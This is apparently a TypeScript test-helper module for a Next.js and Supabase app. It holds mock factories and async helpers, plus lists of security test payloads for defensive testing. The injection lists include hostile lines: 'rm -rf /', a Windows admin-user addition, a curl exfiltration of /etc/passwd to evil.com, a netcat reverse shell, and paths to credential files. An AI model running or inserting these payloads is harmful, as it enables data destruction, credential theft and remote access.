/**
 * Comprehensive Test Helper Utilities
 * 
 * This module provides common utilities, mock factories, security test payloads,
 * and async helpers used across all test files.
 */

import { vi } from 'vitest'
import type { 
  MockUser, 
  MockProfile, 
  MockNextRequest, 
  MockNextRequestOptions,
  MockSupabaseClient,
  TestHelpers 
} from '../types/mocks'

// ============================================================================
// Security Test Payloads
// ============================================================================

/**
 * XSS (Cross-Site Scripting) test payloads
 * These payloads test various XSS attack vectors
 */
export const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src="x" onerror="alert(\'XSS\')">',
  '"><script>alert("XSS")</script>',
  "'><script>alert('XSS')</script>",
  '<svg onload="alert(\'XSS\')">',
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',
  '<body onload="alert(\'XSS\')">',
  '<input onfocus="alert(\'XSS\')" autofocus>',
  'javascript:alert("XSS")',
  '<script>document.cookie="stolen"</script>',
  '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\')">',
  '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
  '<style>@import"javascript:alert(\'XSS\')";</style>',
  '<<SCRIPT>alert("XSS")<</SCRIPT>',
  '<script>String.fromCharCode(88,83,83)</script>',
  '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
  '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
  '<img src="" onerror="alert(String.fromCharCode(88,83,83))">',
  '<svg><script>alert(1)</script></svg>',
  '<img src=x:alert(alt) onerror=eval(src) alt=xss>'
]

/**
 * SQL Injection test payloads
 * These payloads test various SQL injection attack vectors
 */
export const sqlInjectionPayloads = [
  "' OR '1'='1",
  "' OR 1=1--",
  "' OR 1=1/*",
  "' OR 'x'='x",
  "'; DROP TABLE users; --",
  "' UNION SELECT * FROM users--",
  "admin'--",
  "admin'#",
  "admin'/*",
  "' OR 1=1#",
  "' OR 1=1--",
  "') OR '1'='1--",
  "') OR ('1'='1--",
  "1'; DROP TABLE users; --",
  "1' OR '1'='1",
  "1' UNION SELECT null, username, password FROM users--",
  "'/**/OR/**/1=1",
  "' OR EXISTS(SELECT * FROM users)--",
  "' AND (SELECT COUNT(*) FROM users) > 0--",
  "'; INSERT INTO users VALUES('hacker', 'password')--",
  "' OR (SELECT user FROM users WHERE user='system_admin' AND mid(password,1,1)='a')--",
  "1' AND EXTRACT(second FROM NOW())=1--",
  "' OR 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='u'))--"
]

/**
 * Path traversal payloads
 * These payloads test directory traversal vulnerabilities
 */
export const pathTraversalPayloads = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '....\\\\....\\\\....\\\\windows\\system32\\hosts',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
  '/var/log/apache/access.log',
  'C:\\windows\\system32\\drivers\\etc\\hosts',
  '/proc/self/environ',
  '/etc/shadow',
  'file:///etc/passwd',
  'gopher://localhost:8080/../../etc/passwd'
]

/**
 * Command injection payloads  
 * These payloads test command injection vulnerabilities
 */
export const commandInjectionPayloads = [
  '; ls -la',
  '&& cat /etc/passwd',
  '| whoami',
  '$(whoami)',
  '`whoami`',
  '; rm -rf /',
  '& net user hacker password /add',
  '|| dir C:\\',
  '; ping -c 4 evil.com',
  '& echo vulnerable',
  '$(curl http://evil.com/steal?data=$(cat /etc/passwd))',
  '`nc -e /bin/sh evil.com 4444`',
  '; python -c "import os; os.system(\'whoami\')"',
  '&& powershell -c "Get-Process"'
]

/**
 * LDAP injection payloads
 * These payloads test LDAP injection vulnerabilities  
 */
export const ldapInjectionPayloads = [
  '*',
  '*)(&',
  '*))%00',
  ')(cn=*',
  '*(|(password=*))',
  '*(|(objectClass=*))',
  '*)(uid=*))(|(uid=*',
  '*)(&(password=*))',
  '*)(|(mail=*))',
  '*)(userPassword=*)'
]

// ============================================================================
// Mock CSRF Token
// ============================================================================

export const mockCsrfToken = 'mock-csrf-token-12345'

// ============================================================================
// Rate Limiting Simulation
// ============================================================================

/**
 * Simulates rate limiting for testing
 * @param threshold - Number of calls allowed before rate limiting kicks in
 * @returns Function that throws after threshold is reached
 */
export const simulateRateLimit = (threshold: number = 5) => {
  let callCount = 0
  
  return () => {
    callCount++
    if (callCount > threshold) {
      throw new Error('Rate limit exceeded')
    }
    return true
  }
}

// ============================================================================
// Async Test Helpers
// ============================================================================

/**
 * Waits for next tick in event loop
 */
export const waitForNextTick = (): Promise<void> => {
  return new Promise(resolve => {
    process.nextTick(resolve)
  })
}

/**
 * Waits for a specific amount of time
 * @param ms - Milliseconds to wait
 */
export const waitFor = (ms: number): Promise<void> => {
  return new Promise(resolve => setTimeout(resolve, ms))
}

/**
 * Waits for a condition to be true
 * @param predicate - Function that returns true when condition is met
 * @param timeout - Maximum time to wait in ms (default: 5000)
 * @param interval - Check interval in ms (default: 10)
 */
export const waitForCondition = async (
  predicate: () => boolean | Promise<boolean>,
  timeout: number = 5000,
  interval: number = 10
): Promise<void> => {
  const startTime = Date.now()
  
  while (Date.now() - startTime < timeout) {
    const result = await predicate()
    if (result) {
      return
    }
    await waitFor(interval)
  }
  
  throw new Error(`Condition not met within ${timeout}ms`)
}

/**
 * Flushes all pending promises
 */
export const flushPromises = (): Promise<void> => {
  return new Promise(resolve => setImmediate(resolve))
}

// ============================================================================
// Mock Factories
// ============================================================================

/**
 * Creates a mock user with sensible defaults
 */
export const createMockUser = (overrides: Partial<MockUser> = {}): MockUser => ({
  id: `user-${Math.random().toString(36).substr(2, 9)}`,
  email: 'test@example.com',
  password: 'password123',
  created_at: new Date().toISOString(),
  updated_at: new Date().toISOString(),
  email_confirm: true,
  user_metadata: {
    role: 'user',
    organization_id: 'org-1',
    first_name: 'Test',
    last_name: 'User'
  },
  ...overrides
})

/**
 * Creates a mock profile with sensible defaults
 */
export const createMockProfile = (overrides: Partial<MockProfile> = {}): MockProfile => ({
  id: `profile-${Math.random().toString(36).substr(2, 9)}`,
  user_id: 'user-1',
  first_name: 'Test',
  last_name: 'User',
  department: 'Engineering',
  job_title: 'Software Developer',
  preferences: {
    theme: 'dark',
    notifications: true,
    language: 'en'
  },
  created_at: new Date().toISOString(),
  updated_at: new Date().toISOString(),
  ...overrides
})

/**
 * Creates a mock Next.js request
 */
export const createMockNextRequest = (url: string, options: MockNextRequestOptions = {}): MockNextRequest => {
  return {
    url,
    method: options.method || 'GET',
    headers: new Map(Object.entries(options.headers || {})),
    _body: options.body || '',
    async json() {
      return JSON.parse(this._body || '{}')
    },
    async text() {
      return this._body || ''
    }
  }
}

/**
 * Creates a mock Next.js response
 */
export const createMockNextResponse = (data: any, options: { status?: number; headers?: Record<string, string> } = {}) => ({
  status: options.status || 200,
  json: () => Promise.resolve(data),
  headers: new Map(Object.entries(options.headers || {})),
})

// ============================================================================
// Common Mock Objects
// ============================================================================

/**
 * Mock window.matchMedia
 */
export const mockMatchMedia = (matches: boolean = false) => {
  Object.defineProperty(window, 'matchMedia', {
    writable: true,
    value: vi.fn().mockImplementation(query => ({
      matches,
      media: query,
      onchange: null,
      addListener: vi.fn(),
      removeListener: vi.fn(),
      addEventListener: vi.fn(),
      removeEventListener: vi.fn(),
      dispatchEvent: vi.fn(),
    })),
  })
}

/**
 * Mock localStorage
 */
export const mockLocalStorage = () => {
  const store: Record<string, string> = {}
  
  Object.defineProperty(window, 'localStorage', {
    value: {
      getItem: vi.fn((key: string) => store[key] || null),
      setItem: vi.fn((key: string, value: string) => {
        store[key] = value
      }),
      removeItem: vi.fn((key: string) => {
        delete store[key]
      }),
      clear: vi.fn(() => {
        Object.keys(store).forEach(key => delete store[key])
      }),
      length: Object.keys(store).length,
      key: vi.fn((index: number) => Object.keys(store)[index] || null),
    },
    writable: true,
  })
}

/**
 * Mock sessionStorage
 */
export const mockSessionStorage = () => {
  const store: Record<string, string> = {}
  
  Object.defineProperty(window, 'sessionStorage', {
    value: {
      getItem: vi.fn((key: string) => store[key] || null),
      setItem: vi.fn((key: string, value: string) => {
        store[key] = value
      }),
      removeItem: vi.fn((key: string) => {
        delete store[key]
      }),
      clear: vi.fn(() => {
        Object.keys(store).forEach(key => delete store[key])
      }),
      length: Object.keys(store).length,
      key: vi.fn((index: number) => Object.keys(store)[index] || null),
    },
    writable: true,
  })
}

/**
 * Mock ResizeObserver
 */
export const mockResizeObserver = () => {
  global.ResizeObserver = vi.fn().mockImplementation(() => ({
    observe: vi.fn(),
    unobserve: vi.fn(),
    disconnect: vi.fn(),
  }))
}

/**
 * Mock IntersectionObserver
 */
export const mockIntersectionObserver = () => {
  global.IntersectionObserver = vi.fn().mockImplementation(() => ({
    observe: vi.fn(),
    unobserve: vi.fn(),
    disconnect: vi.fn(),
  }))
}

/**
 * Mock getUserMedia for media tests
 */
export const mockGetUserMedia = () => {
  Object.defineProperty(navigator, 'mediaDevices', {
    value: {
      getUserMedia: vi.fn().mockResolvedValue({
        getTracks: () => [{
          stop: vi.fn(),
          kind: 'audio',
          label: 'Mock microphone',
          enabled: true,
        }],
      }),
    },
    writable: true,
  })
}

/**
 * Mock MediaRecorder for audio recording tests
 */
export const mockMediaRecorder = () => {
  global.MediaRecorder = vi.fn().mockImplementation(() => ({
    start: vi.fn(),
    stop: vi.fn(),
    pause: vi.fn(),
    resume: vi.fn(),
    ondataavailable: null,
    onstop: null,
    onstart: null,
    state: 'inactive',
  }))
  
  // Add isTypeSupported static method
  ;(global.MediaRecorder as any).isTypeSupported = vi.fn().mockReturnValue(true)
}

/**
 * Mock Speech Recognition for voice input tests
 */
export const mockSpeechRecognition = () => {
  const mockRecognition = {
    start: vi.fn(),
    stop: vi.fn(),
    onresult: null,
    onerror: null,
    onend: null,
    continuous: false,
    interimResults: false,
    lang: 'en-US',
  }
  
  global.webkitSpeechRecognition = vi.fn().mockImplementation(() => mockRecognition)
  global.SpeechRecognition = vi.fn().mockImplementation(() => mockRecognition)
  
  return mockRecognition
}

/**
 * Mock fetch for network requests
 */
export const mockFetch = (responseData: any = {}, status: number = 200) => {
  global.fetch = vi.fn().mockResolvedValue({
    ok: status >= 200 && status < 300,
    status,
    statusText: 'OK',
    headers: new Headers(),
    json: () => Promise.resolve(responseData),
    text: () => Promise.resolve(JSON.stringify(responseData)),
    blob: () => Promise.resolve(new Blob([JSON.stringify(responseData)])),
    arrayBuffer: () => Promise.resolve(new ArrayBuffer(0)),
    clone: () => mockFetch(responseData, status),
  } as Response)
}

// ============================================================================
// Test Environment Setup
// ============================================================================

/**
 * Sets up a clean test environment with common mocks
 */
export const setupTestEnvironment = () => {
  // Clean up any existing mocks
  vi.clearAllMocks()
  
  // Set up common DOM mocks
  mockMatchMedia()
  mockLocalStorage()
  mockSessionStorage()
  mockResizeObserver()
  mockIntersectionObserver()
  
  // Set up media mocks
  mockGetUserMedia()
  mockMediaRecorder()
  mockSpeechRecognition()
  
  // Set up network mocks
  mockFetch()
  
  // Suppress console methods during tests (unless specifically needed)
  vi.spyOn(console, 'error').mockImplementation(() => {})
  vi.spyOn(console, 'warn').mockImplementation(() => {})
  vi.spyOn(console, 'log').mockImplementation(() => {})
}

/**
 * Cleans up after tests
 */
export const cleanupTestEnvironment = () => {
  vi.restoreAllMocks()
  vi.clearAllMocks()
}

// ============================================================================
// Database Mock Helpers
// ============================================================================

/**
 * Creates a mock Supabase query builder response
 */
export const createMockQueryResponse = (data: any = null, error: any = null) => ({
  data,
  error,
})

/**
 * Creates a mock Supabase query builder chain
 */
export const createMockQueryBuilder = (finalResponse: any = { data: null, error: null }) => {
  const builder = {
    select: vi.fn().mockReturnThis(),
    insert: vi.fn().mockReturnThis(),
    update: vi.fn().mockReturnThis(),
    delete: vi.fn().mockReturnThis(),
    eq: vi.fn().mockReturnThis(),
    neq: vi.fn().mockReturnThis(),
    gte: vi.fn().mockReturnThis(),
    lte: vi.fn().mockReturnThis(),
    in: vi.fn().mockReturnThis(),
    order: vi.fn().mockReturnThis(),
    limit: vi.fn().mockReturnThis(),
    slice: vi.fn().mockReturnThis(),
    single: vi.fn().mockResolvedValue(finalResponse),
  }
  
  // Make the builder thenable for direct await
  builder.then = (onResolve: (value: any) => any) => Promise.resolve(finalResponse).then(onResolve)
  
  return builder
}

// ============================================================================
// Crypto and Security Helpers
// ============================================================================

/**
 * Mock subtle crypto for testing
 */
export const mockSubtleCrypto = () => {
  Object.defineProperty(window, 'crypto', {
    value: {
      subtle: {
        digest: vi.fn().mockResolvedValue(new ArrayBuffer(32)),
        generateKey: vi.fn().mockResolvedValue({}),
        importKey: vi.fn().mockResolvedValue({}),
        sign: vi.fn().mockResolvedValue(new ArrayBuffer(64)),
        verify: vi.fn().mockResolvedValue(true),
      },
      getRandomValues: vi.fn((arr) => {
        for (let i = 0; i < arr.length; i++) {
          arr[i] = Math.floor(Math.random() * 256)
        }
        return arr
      }),
    },
    writable: true,
  })
}

// ============================================================================
// Performance Testing Helpers
// ============================================================================

/**
 * Measures execution time of an async function
 */
export const measureExecutionTime = async <T>(fn: () => Promise<T>): Promise<{ result: T; time: number }> => {
  const start = performance.now()
  const result = await fn()
  const end = performance.now()
  return { result, time: end - start }
}

/**
 * Creates a performance benchmark
 */
export const createBenchmark = (name: string, iterations: number = 100) => {
  const times: number[] = []
  
  return {
    async run<T>(fn: () => Promise<T> | T): Promise<{ 
      average: number
      min: number
      max: number
      total: number
      results: T[] 
    }> {
      const results: T[] = []
      
      for (let i = 0; i < iterations; i++) {
        const start = performance.now()
        const result = await fn()
        const end = performance.now()
        
        times.push(end - start)
        results.push(result)
      }
      
      return {
        average: times.reduce((a, b) => a + b, 0) / times.length,
        min: Math.min(...times),
        max: Math.max(...times),
        total: times.reduce((a, b) => a + b, 0),
        results,
      }
    }
  }
}

// ============================================================================
// Export Test Helpers Object
// ============================================================================

export const testHelpers: TestHelpers = {
  xssPayloads,
  sqlInjectionPayloads,
  mockCsrfToken,
  simulateRateLimit,
}

// ============================================================================
// Global Setup (Auto-executed)
// ============================================================================

// Make test helpers globally available
if (typeof global !== 'undefined') {
  (global as any).testHelpers = testHelpers
}

// Export everything for ES modules
export {
  // Security payloads
  xssPayloads,
  sqlInjectionPayloads, 
  pathTraversalPayloads,
  commandInjectionPayloads,
  ldapInjectionPayloads,
  
  // Async helpers
  waitForNextTick,
  waitFor,
  waitForCondition,
  flushPromises,
  
  // Mock factories
  createMockUser,
  createMockProfile,
  createMockNextRequest,
  createMockNextResponse,
  
  // Common mocks
  mockMatchMedia,
  mockLocalStorage,
  mockSessionStorage,
  mockResizeObserver,
  mockIntersectionObserver,
  mockGetUserMedia,
  mockMediaRecorder,
  mockSpeechRecognition,
  mockFetch,
  mockSubtleCrypto,
  
  // Environment setup
  setupTestEnvironment,
  cleanupTestEnvironment,
  
  // Database helpers
  createMockQueryResponse,
  createMockQueryBuilder,
  
  // Performance helpers
  measureExecutionTime,
  createBenchmark,
  
  // Rate limiting
  simulateRateLimit,
}

export default testHelpers